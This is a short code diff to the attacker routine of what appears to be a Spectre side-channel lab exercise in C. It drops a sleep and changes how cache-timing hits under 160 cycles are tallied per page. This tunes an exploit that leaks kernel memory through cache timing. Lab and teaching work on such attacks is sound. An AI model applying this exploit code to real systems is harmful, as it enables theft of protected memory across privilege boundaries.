@@ -55,7 +55,6 @@ int run_attacker(char *shared_memory) {
             }
 
             init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
-            usleep(10);
             for (int i = 0; i < 2000; i++) {
                 call_kernel_part2(shared_memory, current_offset);
             }
@@ -64,10 +63,10 @@ int run_attacker(char *shared_memory) {
             for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++) {
                 access_time = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
                 if (access_time < 160) {
-                    break;
+                    page_stats[page]++;
                 }
             }
-            page_stats[page]++;
+
 
         }
        // printf("==================== \n");
